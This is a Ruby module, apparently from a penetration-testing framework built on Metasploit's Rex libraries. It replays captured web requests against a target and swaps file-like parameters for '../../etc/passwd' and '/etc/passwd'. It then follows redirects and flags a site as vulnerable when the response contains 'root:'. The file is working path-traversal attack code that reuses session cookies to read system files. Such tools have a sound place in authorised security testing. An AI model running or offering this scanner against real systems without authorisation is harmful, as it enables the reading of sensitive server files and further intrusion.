$: << "#{File.dirname(__FILE__)}/"

require 'json'
require 'file_ext'
require 'rex/socket'
require 'rex/proto/http'
require 'rex/text'
require 'digest'
require 'rex/proto/ntlm/crypt'
require 'rex/proto/ntlm/constants'
require 'rex/proto/ntlm/utils'
require 'rex/proto/ntlm/exceptions'

module PATH_TRAV

  include FILEEXTs

  def chk_p_name(n)
    @f_name.each do |fn|
      return true if n == fn
    end
    return false
  end

  def chk_p_value(v)
    return false if v == nil
    if v.split('.').length == 2
      v_e = v.split('.')[1]
    else
      return false
    end
    @f_exts.each do |fe|
      return true if v_e == fe
    end
    return false
  end

  def chk_param_n_v(params)
    p_name_arr = Array.new()
    p_value_arr = Array.new()
    flg = false
    param_pair = params.split('&')
    param_pair.each do |p|
      flg = false
      p_name = p.split('=')[0]
      p_value = p.split('=')[1]
      if !chk_p_value(p_value)
         flg = chk_p_name(p_name)
      else
         flg = true
      end
      p_name_arr.push p_name
      p_value_arr.push p_value
    end

    return p_name_arr, p_value_arr, flg

  end


  def filter_urls(urls)
    uniq_url_tmp = Array.new()
    pram_url = Hash.new()
    s_url = Array.new()
    p_name_arr = Array.new()
    p_value_arr = Array.new()
    flag = true
   
    urls.each do |url|
      url = url.gsub "?", "\\?"
      url = url.gsub "#", ""
      s_url = url.split('?')
      if s_url.length == 1
        @no_p_url.push(url)
        next
      end
      p_name_arr, p_value_arr, flg = chk_param_n_v(s_url[1])
      next if flg == false
      
      pram_url[s_url[0]] = p_name_arr
      #check if the url is duplicated
      uniq_url_tmp.each do |v|
        if v == pram_url
          flag = false
          break
        else 
          flag = true
        end
      end
      if flag == true
        uniq_url_tmp.push pram_url
        @uniq_url[url] = [p_name_arr,p_value_arr]
        @has_f_url.push(url)
      end

      pram_url = {}

    end
  end


  def chk_f_in_post(url, tck)
    req = @data['requests'][tck]
    p_name_arr = Array.new()
    p_value_arr = Array.new()    



    if req.scan(/boundary=(.*?)\r$/) == []
      params = req.scan(/\r\n\r\n(.*?)$/)[0][0]
      p_name_arr, p_value_arr, flg = chk_param_n_v(params)
      if flg == true
        @uniq_url[url] = [p_name_arr,p_value_arr]
        return true
      end
      return false
    else

      params = ""
      param_parts = req.split(/Content-Disposition: form-data;/)
      param_parts.each_with_index do |p, n|
        pn = ""
        pv = ""
        next if (n == 0 or p.scan(/Content-Type:/) != [])#Didn't check upload file
        p_name = p.scan(/name=\"(.*?)\"/)
        p_value = p.scan(/\r\n\r\n(.*?)\r\n--/)
        pn = p_name[0][0] if p_name != []
        pv = p_value[0][0] if p_value != []
        if n == 1
          params = pn + "=" + pv 
        else
          params = params + "&" + pn + "=" + pv
        end
      end
      p_name_arr, p_value_arr, flg = chk_param_n_v(params)
      if flg == true
        @uniq_url[url] = [p_name_arr,p_value_arr]
        return true
      end
      return false

    end

  end


    #get the URLs that have a patameter contains file
  def filter_request
    post_req = Hash.new()

    @no_p_url.each do |url|

      next if url == "about:blank"

      flg = false
      @data['requests'].each do |tck,detail|

        if (detail.scan(/#{url}\sHTTP/) != [] && detail.scan(/POST/) != [])
            post_req[url] = tck
            flg = true
            break
        end
      end
      if flg
        if chk_f_in_post(url, post_req[url])
          @chk_list[url] = post_req[url]
        end
      end
    end

    @has_f_url.each do |u|
      @data['requests'].each do |tck,detail|
        if detail.scan(/#{u}\sHTTP/) != []
          @chk_list[u] = tck
        end
      end
    end
  end

  def filter_url_request
    urls = Array.new
    @data = Hash.new()
    @uniq_url = Hash.new()
    @chk_list = Hash.new()
    @has_f_url = Array.new()
    @no_p_url = Array.new()

    @f_exts = FILEEXTS
    @f_name = ['doc','file','f','page','p','dir','filename','fname']

    @data = JSON.parse(@session_data, {create_additions:false})
    @cookie=@data['cookie']
    @data['ticks'].each do |tck|
      urls.push(tck['url'])
    end
    urls.uniq!

    #Filter the URLs that contains a file as the parameter
    filter_urls(urls)
    #Filter the related requests of the filtered URLs
    filter_request

    return @chk_list, @uniq_url

  end

  def send_req(req)
    
    uri=URI(@target)
    host=uri.host
    port = uri.port
    context = {}
    ssl = (uri.scheme=='https'?true:false)
    ssl_version = nil
    proxies = nil
    conn=Rex::Proto::Http::Client.new(host,port, context, ssl, ssl_version, proxies)
    begin
        resp = conn.send_recv(req,30)
        #`touch /tmp/caroline-console-#{datastore['CONSOLE_ID']}`
      rescue
        log "Problem #{$!}" 
        resp = "error"
      end
    return resp
  end

  def path_trav(tcks, params)
    vul_url = Array.new()
    flg = false
    i = 0

    tcks.values.each_with_index do |v, n|
      flg = false
      url = params.keys[n]
      config = JSON.parse(@config, {create_additions:false})
      @target=config['target']
      #Get the domain, because target may be many IPs or domains, so use target instead here
      target = config['target']
      domain = target.scan(/(http|https):\/\/(.*?)\//)
      if domain == []
        dom = target
      else
        dom = domain[0][0] + "://"  + domain[0][1]
      end


      log "Now checking path traversal against URL: #{url}..." 
      req = @data['requests'][v]
      mthd = req.scan(/^(.*?) /)[0][0]
      req = req.gsub("#{dom}","")

      p_value = params.values[n][1]
      j = 0

      #Replace the file parameter with test pattern, this is not the final version, '\' or encoded and double encoded '.' '/' '\' need to be checked also.
      p_value.each do |p|
        req_1 = req.gsub("=#{p}","=../../etc/passwd")
        req_1 = req_1.gsub(/Cookie:.*\r\n/,"#{@cookie}\r\n")

        resp = send_req(req_1)      

        if resp == "error"
          j = j + 1
          i = i + 1 if j == p_value.length
          next
        end

        time = 0
        while time < 5
          if resp!= nil && ((resp.code>= 300 && resp.code<=303) || resp.code==307)
            uri=URI(resp['Location'])
            req_1 = req_1.gsub(/POST|GET.*?HTTP/,"GET #{uri} HTTP")
            resp = send_req(req_1)
          end
          time=time+1
        end

        if resp!= nil && resp.code != 200
          log "'.' is not allowed in this URL." 
          next
        end

        #ToDo: replace with dot-slash patterns with different depth, e.g. ../etc/passwd, ../../../../etc/passwd, %2e%2e%2fetc%2fpasswd, ..\etc\passwd 
        req_2 = req.gsub("=#{p}", "=/etc/passwd")
        resp = send_req(req_2)

        time = 0
        while time < 5
          if resp!= nil && ((resp.code>= 300 && resp.code<=303) || resp.code==307)
            uri=URI(resp['Location'])
            req_2 = req_2.gsub(/POST|GET.*?HTTP/,"GET #{uri} HTTP")
            resp = send_req(req_2)
          end
          time=time+1
        end

        flg = true if (resp!= nil && resp.body.scan(/root:/) != [])
      end
      vul_url.push [mthd, url] if flg == true
    end

    return "error" if i == tcks.values.length
    return vul_url

  end

end
